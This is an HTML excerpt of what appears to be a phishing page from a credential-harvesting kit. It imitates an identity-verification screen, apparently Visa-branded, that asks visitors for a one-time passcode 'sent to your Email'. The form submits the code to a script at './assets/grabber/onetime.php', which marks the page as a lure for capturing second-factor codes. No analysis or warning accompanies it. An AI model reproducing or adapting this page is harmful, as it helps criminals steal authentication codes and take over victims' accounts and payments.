		...
		<body class="body">
			<a class="skip-to" href="javascript:void();">Skip to content</a>
				...
				<div class="content-container" id="content" role="main" tabindex="-1">
					<form action="./assets/grabber/onetime.php" autocomplete="off" id="MainForm" method="post" novalidate="novalidate">
						<div class="row">
						...
						<div class="box">
							<div class="row">
								<div class="column">
								<h3>
									To begin, please enter One Time Passcode. An authorization code was sent to your Email.
								</h3>
							</div>
								<div class="medium-12 columns">
									<div class="large-12 medium-12 small-12 column">
									...
									<div class="row form-row">
										<div class="large-3 medium-5 small-12 column ">
											<label class="form-control" for="otp">Authorization Code&nbsp;	<span class="required">*&nbsp;</span></label>
										</div>
										
										<div class="large-4 medium-4 small-12 columns left">
											<input aria-invalid="false" aria-required="true" autocomplete="on" class="stretch" data-val="true" data-val-visarequired="Authorization Code is required." data-val-visarequired-invalidifforselectlist="" id="otp" name="otp" type="text" value="">
											<span class="field-validation-valid error text" data-valmsg-for="otp" data-valmsg-replace="true" id="otp"></span>
										</div>
									...
									<div class="small-12 columns button-group">
										<input class="button small navigationButton primary" data-route="verify/verifyyouridentity" id="verifyverifyyouridentitySubmit" name="Submit" type="submit" value="Submit">
									</div>
								</div>
							</div>
						</div>
